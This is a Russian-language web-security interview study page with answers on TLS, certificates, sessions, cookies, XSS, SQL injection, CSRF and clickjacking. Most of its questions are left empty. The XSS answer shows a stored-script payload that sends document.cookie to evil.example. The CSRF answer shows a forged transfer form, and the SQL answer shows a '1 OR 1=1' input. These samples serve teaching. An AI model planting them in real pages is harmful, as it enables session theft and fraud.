# Web security — Interview

Ответы заполнены для опубликованной части, остальные пустые.

[ ← Вернуться в хаб](./7_special.md)

### Related docs

- [Веб-безопасность](./7_special_security.md) · [Веб-безопасность — Интервью](./7_special_security_interview.md)

### Sections

- [Interview Practice](#interview-practice)

---

## Interview Practice

Вопросы с [Devinterview.io — Web Security](https://devinterview.io/questions/web-and-mobile-development/web-security-interview-questions/).

### Web Security Fundamentals

<details>
<summary>What is web security, and why is it important?</summary>

### What is web security, and why is it important?

**Definition:**

Веб-безопасность — набор мер, которые сохраняют данные сайта конфиденциальными и целыми и оставляют их доступными тем, кому пользоваться разрешено.

**How it works:**

- Конфиденциальность значит, что данные читают только допущенные стороны. Целостность значит, что изменение можно заметить. Доступность значит, что сервис работает, когда должен.
- TLS шифрует транспорт и позволяет клиенту проверить личность сервера.
- Аутентификация устанавливает, кто вызывающий. Авторизация решает, что этому вызывающему можно делать.
- Заголовки ответа сужают то, что сделает браузер: `X-Content-Type-Options: nosniff` запрещает угадывание MIME, `X-Frame-Options` или CSP `frame-ancestors` запрещает встраивание во фрейм, а `Content-Security-Policy` ограничивает, откуда можно загружать скрипты. Старый заголовок `X-XSS-Protection` снят. На него не опираются.
- Тело запроса, строку запроса и заголовки считайте данными. Кодируйте их на выводе и отправляйте запросы с параметрами, чтобы текст пользователя не стал SQL или HTML.
- Запросам, которые меняют состояние, нужен CSRF-токен, который страница атакующего прочитать не может. Сессионным cookie нужны `Secure`, `HttpOnly` и осмысленный `SameSite`, а идентификатор сессии должен меняться при входе.

**Examples:**

```text
Strict-Transport-Security: max-age=63072000
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
```

</details>

<details>
<summary>Can you explain what HTTPS is and how it differs from HTTP?</summary>

### Can you explain what HTTPS is and how it differs from HTTP?

**Definition:**

HTTPS — это HTTP внутри TLS. Запрос и ответ имеют ту же форму, что у HTTP, а байты на проводе зашифрованы и проверены.

**How it works:**

- TLS даёт шифрование, сертификат, который клиент может проверить, и проверку целостности каждой записи.
- HTTP идёт открытым текстом и по соглашению использует порт 80. HTTPS использует порт 443. Браузеры помечают простой HTTP как небезопасный, и для всего, что не игрушка, нужен HTTPS.
- Рукопожатие согласует версию TLS и набор шифров, проверяет сертификат по доверенному центру и выводит свежие ключи трафика. Современные наборы используют эфемерный Диффи–Хеллман, поэтому поздняя кража закрытого ключа сервера не расшифровывает старые сессии.
- Центр сертификации выпускает сертификат. Инфраструктура открытых ключей — это набор центров, сертификатов и данных отзыва, которым доверяют браузеры.
- Лишние круги стоят немного задержки. Возобновление сессии и HTTP/2 отыгрывают большую часть этого на следующих запросах.

**Examples:**

```text
http://shop.example/cart    открытый текст, порт 80
https://shop.example/cart   TLS, порт 443
```

</details>

<details>
<summary>What are SSL and TLS, and what role do they play in web security?</summary>

### What are SSL and TLS, and what role do they play in web security?

**Definition:**

SSL и TLS — протоколы, которые оборачивают соединение, чтобы стороны могли аутентифицироваться, шифровать и замечать подмену. Разворачивают TLS. SSL 2.0 и 3.0 устарели, и их нужно отключить.

**How it works:**

- Сервер предъявляет сертификат. Клиент проверяет имя, сроки и цепочку до доверенного якоря.
- После рукопожатия трафик идёт симметричным шифрованием, например AES. Операции с открытым ключом нужны, чтобы аутентифицировать сторону и согласовать симметричный ключ, потому что они медленнее.
- Хеш вроде SHA-256 входит в конструкцию целостности. Изменённый байт проваливает проверку, и соединение останавливается.
- Прямая секретность — свойство наборов с новым эфемерным ключом (ECDHE). Она не появляется сама в каждом историческом наборе шифров. RC4 и другие сломанные алгоритмы неприемлемы.
- Разрешают TLS 1.2 и 1.3. Рукопожатие опускается только до настроенного вами уровня, поэтому старые версии отключают, а не надеются, что клиент выберет хорошо.

**Examples:**

Значок замка в браузере значит, что сертификат прошёл проверку и запросы этой страницы идут по TLS. Он не значит, что в приложении нет ошибок внедрения.

</details>

<details>
<summary>How do SSL certificates work, and what is the purpose of a Certificate Authority (CA)?</summary>

### How do SSL certificates work, and what is the purpose of a Certificate Authority (CA)?

**Definition:**

Сертификат SSL/TLS связывает открытый ключ с именем. Центр сертификации подписывает эту связь, чтобы браузер доверял ей, не встречая сервер раньше.

**How it works:**

- Рукопожатие согласует алгоритмы и выводит ключи трафика. Сертификат — то, благодаря чему клиент знает, что открытый ключ принадлежит имени в URL.
- Центр проверяет контроль запрашивающего над именем (а для более строгих сертификатов — организацию), подписывает сертификат и позже может отозвать его.
- Сертификат несёт издателя, окно действия, субъект (имя), открытый ключ и подпись издателя над этими полями.
- PEM — текстовая форма Base64, которую вставляют в конфиги. DER — двоичная запись той же структуры.
- Самоподписанный сертификат подписан своим же ключом. Он годится для локальной проверки и бесполезен для публичных пользователей: их браузеры вам не доверяют. Публично доверенный сертификат приходит от центра, который уже есть в хранилище браузера.

**Examples:**

```text
subject: shop.example
issuer: Example CA
public key: (server key)
not after: 2027-04-01
signature: signed by Example CA
```

</details>

<details>
<summary>What is the difference between encryption and hashing?</summary>

### What is the difference between encryption and hashing?

**Definition:**

Шифрование обратимо, если есть ключ. Хеширование одностороннее: оно отображает данные в дайджест фиксированной длины, и вход из дайджеста не восстановить.

**How it works:**

- Шифруют, когда тот, у кого есть ключ, должен прочитать данные позже: сообщение, диск, запись TLS.
- Хешируют, когда нужно заметить изменение или хранить проверку пароля, не храня пароль. Проверка хеширует новый вход и сравнивает дайджесты.
- Хранилище паролей использует медленный хеш с солью (bcrypt, scrypt или Argon2), а не быструю контрольную сумму вроде голого SHA-256.
- Один и тот же вход и ключ всегда дают один шифртекст. Хеш одинаковых входов совпадает. Изменение одного бита во входе должно широко менять дайджест.

**Examples:**

```text
encrypt("invoice 42", key) → шифртекст, который decrypt(key) возвращает назад
hash("invoice 42")         → дайджест, который сравнивают, а не расшифровывают
```

</details>

<details>
<summary>Define the concept of a secure session and explain how it is established.</summary>

### Define the concept of a secure session and explain how it is established.

**Definition:**

Защищённая сессия — отрезок запросов, который сервер считает одним аутентифицированным пользователем и защищает так, чтобы посторонний не мог его прочитать или подделать следующий запрос.

**How it works:**

- На проводе TLS согласует ключи трафика для этого соединения. Современные рукопожатия выводят их эфемерным Диффи–Хеллманом. Сервер доказывает своё имя сертификатом. Открытый ключ клиента не шифрует ключ сессии. Старый транспорт ключа RSA шифровал premaster-секрет открытым ключом сервера, и этот режим устарел.
- Ключи должны быть непредсказуемыми и достаточно длинными. AES-128 — обычный нижний порог для ключа трафика. Свежий эфемерный ключ даёт прямую секретность: поздняя компрометация долговременного ключа сервера эту сессию не открывает.
- В приложении сервер хранит состояние пользователя и отправляет только случайный идентификатор сессии, обычно в cookie. Смена этого идентификатора при входе закрывает фиксацию. Отдельный CSRF-токен или cookie `SameSite` плюс свой заголовок не даёт другому сайту проехаться на сессии.
- Короткоживущие токены — та же идея в API: токен именует выданное право и истекает.

**Examples:**

```text
Set-Cookie: sid=8f3c…; Secure; HttpOnly; SameSite=Lax
```

Браузер хранит `sid`. JavaScript его не читает. Сервер ищет `sid` и находит пользователя.

</details>

<details>
<summary>What are some common web security vulnerabilities?</summary>

### What are some common web security vulnerabilities?

**Definition:**

Слабости, которые всплывают снова и снова, — это внедрение, межсайтовый скриптинг, сломанная аутентификация, неверная конфигурация, небезопасные ссылки на объекты, межсайтовая подделка запроса и открытые перенаправления.

**How it works:**

- SQL-инъекция случается, когда текст пользователя склеивают в запрос. `1 OR 1=1` меняет условие. Передавайте значение параметром или позвольте это сделать построителю запросов. Не собирайте SQL склейкой строк.
- XSS случается, когда текст пользователя пишут в HTML или JavaScript без кодирования, и `<script>` выполняется в браузере жертвы. Кодируйте на выводе под контекст и задайте Content Security Policy.
- Сломанная аутентификация — это угадываемые пароли, идентификаторы сессии в URL или сессия, которая никогда не сменяется. Храните медленный хеш пароля и ставьте на сессионную cookie `HttpOnly` и `Secure`.
- Неверная конфигурация — пароль администратора по умолчанию, трассировка стека в проде или публичное хранилище. Проверяйте развёрнутые настройки и выдавайте наименьшие достаточные права.
- Небезопасная прямая ссылка на объект — это `/invoices/42` без проверки, что этот пользователь владеет счётом 42. Авторизуйте объект и не считайте идентификатор секретом.
- CSRF — сайт, который посещает жертва, заставляет её браузер отправить ваши cookie на ваш сайт. Требуйте токен на запросах, которые меняют состояние.
- Открытое перенаправление отправляет браузер на любой URL из параметра. Разрешайте только относительные пути или фиксированный список хостов.

**Examples:**

```text
GET /invoices/42          обязан проверить, что вызывающий владеет 42
GET /next?url=https://evil.example   туда перенаправлять нельзя
```

</details>

<details>
<summary>Can you explain the Cross-Site Scripting (XSS) attack and how to prevent it?</summary>

### Can you explain the Cross-Site Scripting (XSS) attack and how to prevent it?

**Definition:**

Межсайтовый скриптинг выполняет скрипт атакующего в браузере жертвы, в origin сайта, который доверился тексту атакующего.

**How it works:**

- Скрипт может читать DOM, действовать как пользователь, переписывать страницу или уводить пользователя. Cookie с пометкой `HttpOnly` этот скрипт не читает. Cookie без флага — читает.
- Хранимый XSS сохраняет нагрузку, например в комментарии, и запускает её у каждого, кто открыл страницу. Отражённый XSS возвращает нагрузку в ответе на запрос, который её принёс. DOM XSS собирает клиентский код из URL или другого ввода браузера.
- Устойчивое исправление — кодирование вывода под контекст: текст HTML, атрибут и JavaScript кодируют по-разному. Content Security Policy, которая не разрешает встроенные скрипты, ограничивает то, что сможет сделать пропущенное кодирование.
- Проверяйте ввод, когда знаете форму (целое, дата). Проверка не заменяет кодирование. `HttpOnly` и `Secure` на cookie уменьшают добычу.
- Просматривайте места, где HTML собирают из данных. Ненадёжную разметку не выполняют «чтобы посмотреть», вне песочницы.

**Examples:**

```text
comment: <script>fetch('https://evil.example/?c='+document.cookie)</script>
```

Если сохранить это текстом и вставить с экранированием HTML, браузер покажет теги. Если вставить как HTML, скрипт выполнится.

</details>

<details>
<summary>What is SQL Injection and how can you defend against it?</summary>

### What is SQL Injection and how can you defend against it?

**Definition:**

SQL-инъекция — это ввод пользователя, который база выполняет как SQL, потому что приложение вклеило этот ввод в текст оператора.

**How it works:**

- Обычный вход — поле формы или параметр запроса. Атакующий закрывает задуманное условие и добавляет своё, чтобы прочитать строки, изменить их или выполнить второй оператор, если движок это позволяет.
- Параметризованный, или подготовленный, оператор держит текст SQL фиксированным и передаёт значение отдельно. Движок не разбирает значение как синтаксис.
- Хранимая процедура помогает, только если она тоже принимает параметры. Процедура, которая внутри склеивает строку, по-прежнему уязвима.
- ORM или построитель запросов безопасен, когда пользуются его API параметров. Он небезопасен, когда ему передают сырой фрагмент.
- Отказ от неожиданных символов — запасной слой. На него не опираются: пропущенный класс символов становится обходом.

**Examples:**

```python
# значение не может изменить оператор
cursor.execute(
    "SELECT id FROM invoices WHERE customer_id = %s",
    (customer_id,),
)
```

</details>

<details>
<summary>Describe what Cross-Site Request Forgery (CSRF) is and how to prevent it.</summary>

### Describe what Cross-Site Request Forgery (CSRF) is and how to prevent it.

**Definition:**

Межсайтовая подделка запроса заставляет браузер жертвы отправить меняющий состояние запрос на сайт, где жертва уже вошла. Браузер прикладывает cookie. Жертва отправлять запрос не собиралась.

**How it works:**

- Жертва открывает страницу атакующего, пока cookie сессии вашего сайта ещё хранится. Страница отправляет форму или грузит URL, направленный на ваш сайт. Политика одного источника этот запрос не останавливает. Она не даёт скрипту атакующего прочитать ответ.
- Токен-синхронизатор — случайное значение в форме или заголовке, которое проверяет сервер. Страница атакующего не может прочитать его с вашего origin, поэтому не может прислать совпадающий токен.
- Cookie, которая не является сессионной и которую эхом возвращают в заголовке (double submit), — та же идея, когда скрипт вашего origin может прочитать эту cookie, а скрипт чужого origin не может.
- `SameSite=Lax` или `Strict` останавливает многие межсайтовые отправки cookie. Это не полная замена токена для API, которые другие сайты должны вызывать.
- Просите пользователя подтвердить необратимое действие. Отдавайте сайт только по HTTPS, чтобы cookie не украли по дороге: это уже другая проблема.

**Examples:**

```html
<!-- на evil.example, пока жертва вошла на shop.example -->
<form action="https://shop.example/transfer" method="POST">
  <input name="to" value="attacker">
</form>
```

Форме нужен токен, который атакующий не видит, либо cookie не должна уходить с этим межсайтовым POST.

</details>

<details>
<summary>Explain the Same-Origin Policy and its importance in web security.</summary>

### Explain the Same-Origin Policy and its importance in web security.

**Definition:**

Политика одного источника — правило браузера: документ может свободно читать другой документ, только если совпадают протокол, хост и порт.

**How it works:**

- `https://shop.example` и `https://shop.example` совпадают. `http://shop.example`, `https://other.example` и `https://shop.example:8443` — нет.
- Из-за этого вредоносная страница не может прочитать вашу страницу счёта или тела ответов только потому, что открыты обе вкладки.
- Она ограничивает, что скрипт может сделать с другим origin. Сама по себе она не мешает этому origin получить запрос, поэтому CSRF по-прежнему нужен токен.
- Cookie не отправляются на другой хост, поэтому один origin не получает сессионную cookie другого. Это отдельно от XSS на origin, которому cookie принадлежит.
- CORS — способ, которым сервер явно разрешает конкретные межсайтовые чтения. iframe может встроить другую страницу, и родитель всё равно не читает документ фрейма, если origin не совпадают.
- Поддомены — разные хосты. Старые браузеры были менее последовательны. Системы, которые должны вызываться со многих веб-origin, говорят об этом явно. Свободного пропуска у них нет.

**Examples:**

```text
https://shop.example/app  и  https://shop.example/api   один origin
https://shop.example      и  https://cdn.shop.example   разные хосты
```

</details>

<details>
<summary>What is Clickjacking, and what measures can prevent it?</summary>

### What is Clickjacking, and what measures can prevent it?

**Definition:**

Кликджекинг — страница, которая встраивает ваш сайт во фрейм, прячет фрейм и совмещает ваши кнопки с тем, что пользователь собирался нажать.

**How it works:**

- Прозрачный iframe или спозиционированный слой лежит поверх безобидного с виду элемента. Щелчок попадает на вашу встроенную страницу.
- Варианты с перетаскиванием обманом заставляют пользователя перенести данные на цель атакующего.
- Отправляйте `Content-Security-Policy: frame-ancestors 'none'` или `'self'`, если встраиваете сами себя. `X-Frame-Options: DENY` (или `SAMEORIGIN`) — старый заголовок, который всё ещё помогает там, где CSP игнорируют.
- Скрипт, который уводит верхнее окно, — слабый запасной слой. Он не работает, когда скрипты ограничены, а заголовок работает и при выключенных скриптах.
- Pointer Lock API — не защита от кликджекинга.

**Examples:**

```text
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

</details>

<details>
<summary>How can web cookies compromise security, and how do you safeguard against these risks?</summary>

### How can web cookies compromise security, and how do you safeguard against these risks?

**Definition:**

Cookie становится проблемой безопасности, когда её кража, чтение из скрипта или запись в неё чувствительных данных позволяет кому-то другому действовать как пользователь.

**How it works:**

- Перехват сессии — это использование украденного идентификатора. Помечайте cookie `Secure`, чтобы она уходила только по HTTPS, и `HttpOnly`, чтобы скрипт страницы не мог её прочитать. Выдавайте новый идентификатор при аутентификации и завершайте простой.
- XSS — обычный способ, которым скрипт крадёт cookie без `HttpOnly`. Исправления — кодирование вывода и Content Security Policy. Флаги cookie только ограничивают ущерб.
- Не кладите в cookie пароли, персональные данные или решения об авторизации. Храните случайный идентификатор, а данные держите на сервере. Если значение всё же приходится класть в cookie, подпишите или зашифруйте его и всё равно считайте, что клиент его видит, если скрипт может его прочитать.
- Префикс `__Host-` требует `Secure`, путь `/` и отсутствие `Domain`, чтобы поддомен не мог подложить cookie. `__Secure-` требует `Secure`.

**Examples:**

```text
Set-Cookie: __Host-sid=8f3c…; Secure; HttpOnly; Path=/; SameSite=Lax
```

</details>

<details>
<summary>What is a Man-in-the-Middle (MitM) attack and how can it be prevented?</summary>

### What is a Man-in-the-Middle (MitM) attack and how can it be prevented?

**Definition:**

Атака «человек посередине» — это кто-то на пути между двумя сторонами, кто читает или меняет трафик и, если стороны не аутентифицируют друг друга, притворяется одной из них.

**How it works:**

- Открытый Wi-Fi, поддельный сайт и подменённый почтовый путь — обычные места, где это происходит.
- TLS с проверенным сертификатом закрывает веб-случай: у атакующего нет сертификата на ваше имя, который примет хранилище клиента, и рукопожатие срывается.
- HSTS говорит браузеру использовать HTTPS для вашего хоста, даже если ссылка говорит HTTP, и этим блокирует понижение. Привязка сертификата, в основном в нативных приложениях, отвергает любой сертификат, кроме тех, что вы поставили.
- В локальной сети 802.1X аутентифицирует устройства до выдачи доступа, а WPA2 или WPA3 защищают беспроводное звено. Система обнаружения или предотвращения вторжений смотрит на оставшийся странный трафик.
- Значок замка, который пользователей приучили не замечать, или предупреждение о сертификате, которое их приучили прощёлкивать, отменяет протокол.

**Examples:**

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains
```

После первого визита по HTTPS браузер отказывается от повторной открытой попытки к этому хосту.

</details>

<details>
<summary>Describe the concept of session management in web security.</summary>

### Describe the concept of session management in web security.

**Definition:**

Управление сессией — это то, как сервер помнит пользователя между запросами HTTP, которые иначе независимы, и как он не даёт пользоваться этой памятью кому-то другому.

**How it works:**

- Данные держит сервер. Клиент держит только идентификатор. Обычный носитель — cookie. Идентификатор в URL, в скрытом поле формы или в своём заголовке утекает в журналы, referrer или скрипт.
- Идентификатор должен быть длинным и случайным. Предсказуемые идентификаторы — это угадывание сессии.
- Перехват использует украденный идентификатор. Фиксация подкладывает идентификатор, который атакующий уже знает, и ждёт, пока жертва войдёт с ним. Смена идентификатора при входе закрывает фиксацию.
- CSRF едет на настоящей сессии. Это закрывают токен или `SameSite`. Слабая настройка CORS, которая отражает любой origin и разрешает учётные данные, позволяет другому сайту читать аутентифицированные ответы.
- Используйте TLS, ставьте `Secure` и `HttpOnly`, завершайте простой и проверяйте сессию на сервере для каждого защищённого действия. Слабая настройка TLS обесценивает флаги cookie.

**Examples:**

```text
вход успешен
  → забыть анонимный sid
  → Set-Cookie: sid=<новый случайный>; Secure; HttpOnly; SameSite=Lax
30 минут простоя
  → забыть этот sid на сервере
```

</details>


### Authentication and Authorization

<details>
<summary>What is the difference between authentication and authorization?</summary>

### What is the difference between authentication and authorization?

**Definition:**

</details>

<details>
<summary>Explain basic authentication and its weaknesses.</summary>

### Explain basic authentication and its weaknesses.

**Definition:**

</details>

<details>
<summary>What is OAuth, and how does it work?</summary>

### What is OAuth, and how does it work?

**Definition:**

</details>

<details>
<summary>What is OpenID and how does it relate to web security?</summary>

### What is OpenID and how does it relate to web security?

**Definition:**

</details>

<details>
<summary>Can you describe Multi-Factor Authentication (MFA) and where it's used?</summary>

### Can you describe Multi-Factor Authentication (MFA) and where it's used?

**Definition:**

</details>

<details>
<summary>What is JWT (JSON Web Tokens) and how are they used in authentication?</summary>

### What is JWT (JSON Web Tokens) and how are they used in authentication?

**Definition:**

</details>

<details>
<summary>How do you securely store user passwords?</summary>

### How do you securely store user passwords?

**Definition:**

</details>

<details>
<summary>What is Single Sign-On (SSO) and what are its benefits?</summary>

### What is Single Sign-On (SSO) and what are its benefits?

**Definition:**

</details>

<details>
<summary>Explain role-based access control (RBAC) and how it is implemented.</summary>

### Explain role-based access control (RBAC) and how it is implemented.

**Definition:**

</details>

<details>
<summary>What are the best practices for handling user session timeouts?</summary>

### What are the best practices for handling user session timeouts?

**Definition:**

</details>


### Network Security Concerns

<details>
<summary>What is a firewall, and how does it contribute to web security?</summary>

### What is a firewall, and how does it contribute to web security?

**Definition:**

</details>

<details>
<summary>Define a Virtual Private Network (VPN) and its significance in enhancing web security.</summary>

### Define a Virtual Private Network (VPN) and its significance in enhancing web security.

**Definition:**

</details>

<details>
<summary>What is an Intrusion Detection System (IDS) vs. an Intrusion Prevention System (IPS)?</summary>

### What is an Intrusion Detection System (IDS) vs. an Intrusion Prevention System (IPS)?

**Definition:**

</details>

<details>
<summary>How does a Distributed Denial-of-Service (DDoS) attack work, and how can websites be protected from it?</summary>

### How does a Distributed Denial-of-Service (DDoS) attack work, and how can websites be protected from it?

**Definition:**

</details>

<details>
<summary>Explain the concept of a Content Delivery Network (CDN) and its importance in web security.</summary>

### Explain the concept of a Content Delivery Network (CDN) and its importance in web security.

**Definition:**

</details>


### Secure Coding Practices

<details>
<summary>What are secure coding practices, and why are they needed?</summary>

### What are secure coding practices, and why are they needed?

**Definition:**

</details>

<details>
<summary>How can input validation prevent web security threats?</summary>

### How can input validation prevent web security threats?

**Definition:**

</details>

<details>
<summary>What are parameterized queries, and how do they prevent SQL injection?</summary>

### What are parameterized queries, and how do they prevent SQL injection?

**Definition:**

</details>

<details>
<summary>Why should developers avoid security through obscurity?</summary>

### Why should developers avoid security through obscurity?

**Definition:**

</details>

<details>
<summary>How do you securely handle file uploads to prevent web security issues?</summary>

### How do you securely handle file uploads to prevent web security issues?

**Definition:**

</details>


### Data Protection and Privacy

<details>
<summary>Define Personally Identifiable Information (PII) and discuss how it should be protected.</summary>

### Define Personally Identifiable Information (PII) and discuss how it should be protected.

**Definition:**

</details>

<details>
<summary>What is the General Data Protection Regulation (GDPR), and what are its key tenets?</summary>

### What is the General Data Protection Regulation (GDPR), and what are its key tenets?

**Definition:**

</details>

<details>
<summary>What are data encryption best practices for sensitive information?</summary>

### What are data encryption best practices for sensitive information?

**Definition:**

</details>

<details>
<summary>Explain data masking and how it can protect sensitive data.</summary>

### Explain data masking and how it can protect sensitive data.

**Definition:**

</details>

<details>
<summary>What steps can organizations take to ensure data privacy?</summary>

### What steps can organizations take to ensure data privacy?

**Definition:**

</details>


### Advanced Web Security Concepts

<details>
<summary>What are security headers, and why are they important?</summary>

### What are security headers, and why are they important?

**Definition:**

</details>

<details>
<summary>What is Content Security Policy (CSP) and how does it improve web security?</summary>

### What is Content Security Policy (CSP) and how does it improve web security?

**Definition:**

</details>

<details>
<summary>Can you explain the role of Subresource Integrity (SRI) in web security?</summary>

### Can you explain the role of Subresource Integrity (SRI) in web security?

**Definition:**

</details>

<details>
<summary>What is Domain Name System Security Extensions (DNSSEC), and how does it work?</summary>

### What is Domain Name System Security Extensions (DNSSEC), and how does it work?

**Definition:**

</details>

<details>
<summary>What is HTTP Strict Transport Security (HSTS) and how can it be used?</summary>

### What is HTTP Strict Transport Security (HSTS) and how can it be used?

**Definition:**

</details>


### Security Testing and Audits

<details>
<summary>What is penetration testing, and how does it differ from vulnerability scanning?</summary>

### What is penetration testing, and how does it differ from vulnerability scanning?

**Definition:**

</details>

<details>
<summary>How is fuzzing used in security testing?</summary>

### How is fuzzing used in security testing?

**Definition:**

</details>

<details>
<summary>What are the main objectives of a security audit?</summary>

### What are the main objectives of a security audit?

**Definition:**

</details>

<details>
<summary>Can you explain the concept of threat modeling?</summary>

### Can you explain the concept of threat modeling?

**Definition:**

</details>

<details>
<summary>What is static code analysis and how it is beneficial in identifying security risks?</summary>

### What is static code analysis and how it is beneficial in identifying security risks?

**Definition:**

</details>


### Compliance and Standards

<details>
<summary>What are some common web security compliance standards?</summary>

### What are some common web security compliance standards?

**Definition:**

</details>

<details>
<summary>Explain the purpose and key aspects of ISO/IEC 27001.</summary>

### Explain the purpose and key aspects of ISO/IEC 27001.

**Definition:**

</details>

<details>
<summary>What is PCI DSS and its relevance to web security?</summary>

### What is PCI DSS and its relevance to web security?

**Definition:**

</details>

<details>
<summary>Can you discuss the importance of HIPAA compliance in web applications?</summary>

### Can you discuss the importance of HIPAA compliance in web applications?

**Definition:**

</details>


### Emerging Threats and Trends

<details>
<summary>How do you stay informed about the latest web security threats?</summary>

### How do you stay informed about the latest web security threats?

**Definition:**

</details>

<details>
<summary>Can you discuss the implications of quantum computing on web security?</summary>

### Can you discuss the implications of quantum computing on web security?

**Definition:**

</details>

<details>
<summary>What role does artificial intelligence play in web security?</summary>

### What role does artificial intelligence play in web security?

**Definition:**

</details>

<details>
<summary>How can Internet of Things (IoT) devices create web security risks?</summary>

### How can Internet of Things (IoT) devices create web security risks?

**Definition:**

</details>

<details>
<summary>What is Zero Trust security architecture?</summary>

### What is Zero Trust security architecture?

**Definition:**

</details>


### Incident Response and Handling

<details>
<summary>What is an incident response plan, and why is it critical?</summary>

### What is an incident response plan, and why is it critical?

**Definition:**

</details>

<details>
<summary>Explain the steps you would take after discovering a data breach.</summary>

### Explain the steps you would take after discovering a data breach.

**Definition:**

</details>

<details>
<summary>How important is user training in preventing web security incidents?</summary>

### How important is user training in preventing web security incidents?

**Definition:**

</details>

<details>
<summary>Can you discuss the role of a Security Operations Center (SOC)?</summary>

### Can you discuss the role of a Security Operations Center (SOC)?

**Definition:**

</details>


### Cloud Security

<details>
<summary>How does web security change when applications are moved to the cloud?</summary>

### How does web security change when applications are moved to the cloud?

**Definition:**

</details>

<details>
<summary>What are the shared responsibility models in cloud security?</summary>

### What are the shared responsibility models in cloud security?

**Definition:**

</details>

<details>
<summary>Explain how encryption is handled in the cloud.</summary>

### Explain how encryption is handled in the cloud.

**Definition:**

</details>

<details>
<summary>What special considerations are there for web security with cloud storage services?</summary>

### What special considerations are there for web security with cloud storage services?

**Definition:**

</details>

<details>
<summary>How does a Web Application Firewall (WAF) protect cloud-hosted web applications?</summary>

### How does a Web Application Firewall (WAF) protect cloud-hosted web applications?

**Definition:**

</details>


### Security in Web Application Frameworks

<details>
<summary>What built-in security features do modern web application frameworks typically include?</summary>

### What built-in security features do modern web application frameworks typically include?

**Definition:**

</details>

<details>
<summary>How does Ruby on Rails handle web security, and what are its built-in protection mechanisms?</summary>

### How does Ruby on Rails handle web security, and what are its built-in protection mechanisms?

**Definition:**

</details>

<details>
<summary>What are the security features provided by Django for Python web applications?</summary>

### What are the security features provided by Django for Python web applications?

**Definition:**

</details>

<details>
<summary>How does ASP.NET Core enforce web security?</summary>

### How does ASP.NET Core enforce web security?

**Definition:**

</details>

<details>
<summary>What security considerations must be taken into account when using client-side JavaScript frameworks like Angular, React, or Vue.js?</summary>

### What security considerations must be taken into account when using client-side JavaScript frameworks like Angular, React, or Vue.js?

**Definition:**

</details>


### Mobile Web Security

<details>
<summary>How do mobile web applications pose unique security challenges?</summary>

### How do mobile web applications pose unique security challenges?

**Definition:**

</details>

<details>
<summary>What steps can be taken to secure mobile APIs and services?</summary>

### What steps can be taken to secure mobile APIs and services?

**Definition:**

</details>

<details>
<summary>Discuss the security implications of third-party libraries in mobile web app development.</summary>

### Discuss the security implications of third-party libraries in mobile web app development.

**Definition:**

</details>

<details>
<summary>What are common vulnerabilities found in mobile web applications?</summary>

### What are common vulnerabilities found in mobile web applications?

**Definition:**

</details>


### Secure Infrastructure

<details>
<summary>How does server hardening affect web security?</summary>

### How does server hardening affect web security?

**Definition:**

</details>

<details>
<summary>Explain the importance of patch management in maintaining web security.</summary>

### Explain the importance of patch management in maintaining web security.

**Definition:**

</details>

<details>
<summary>What is network segmentation, and how can it improve security for web applications?</summary>

### What is network segmentation, and how can it improve security for web applications?

**Definition:**

</details>

<details>
<summary>Describe how load balancers can be configured to improve web application security.</summary>

### Describe how load balancers can be configured to improve web application security.

**Definition:**

</details>


### Cryptography in Web Security

<details>
<summary>What is the difference between symmetric and asymmetric encryption, and how are they used in web security?</summary>

### What is the difference between symmetric and asymmetric encryption, and how are they used in web security?

**Definition:**

</details>

<details>
<summary>Explain the role of digital signatures in maintaining web security.</summary>

### Explain the role of digital signatures in maintaining web security.

**Definition:**

</details>

<details>
<summary>What is a cryptographic hash function, and where is it used in web security?</summary>

### What is a cryptographic hash function, and where is it used in web security?

**Definition:**

</details>

<details>
<summary>How can Public Key Infrastructure (PKI) be used to secure web applications?</summary>

### How can Public Key Infrastructure (PKI) be used to secure web applications?

**Definition:**

</details>


### DevSecOps and Web Security

<details>
<summary>How does DevSecOps integrate security into the web development lifecycle?</summary>

### How does DevSecOps integrate security into the web development lifecycle?

**Definition:**

</details>

<details>
<summary>What are security Information and Event Management (SIEM) systems and their role in web security?</summary>

### What are security Information and Event Management (SIEM) systems and their role in web security?

**Definition:**

</details>

<details>
<summary>How can containerization improve web security?</summary>

### How can containerization improve web security?

**Definition:**

</details>

<details>
<summary>Discuss the role of automated security pipelines in web application deployments.</summary>

### Discuss the role of automated security pipelines in web application deployments.

**Definition:**

</details>


### API and Web Service Security

<details>
<summary>What are the primary concerns for REST API security?</summary>

### What are the primary concerns for REST API security?

**Definition:**

</details>

<details>
<summary>How does OAuth 2.0 provide secure delegated access?</summary>

### How does OAuth 2.0 provide secure delegated access?

**Definition:**

</details>

<details>
<summary>What are best practices for securing GraphQL APIs?</summary>

### What are best practices for securing GraphQL APIs?

**Definition:**

</details>

<details>
<summary>How can webhooks be secured to ensure they are not exploited?</summary>

### How can webhooks be secured to ensure they are not exploited?

**Definition:**

</details>

<details>
<summary>Explain the significance of rate limiting in API security.</summary>

### Explain the significance of rate limiting in API security.

**Definition:**

</details>


### Web Security Culture and Policy

<details>
<summary>How do you foster a culture of security within a web development team?</summary>

### How do you foster a culture of security within a web development team?

**Definition:**

</details>

<details>
<summary>What should a web security policy include?</summary>

### What should a web security policy include?

**Definition:**

</details>

<details>
<summary>Discuss the process of conducting a security risk assessment for web applications.</summary>

### Discuss the process of conducting a security risk assessment for web applications.

**Definition:**

</details>

<details>
<summary>How does change management impact web security?</summary>

### How does change management impact web security?

**Definition:**

</details>

<details>
<summary>Why should a company have an established data breach response protocol?</summary>

### Why should a company have an established data breach response protocol?

**Definition:**

</details>


### Miscellaneous Web Security

<details>
<summary>What is the Secure Development Lifecycle (SDL) and its relevance to web security?</summary>

### What is the Secure Development Lifecycle (SDL) and its relevance to web security?

**Definition:**

</details>
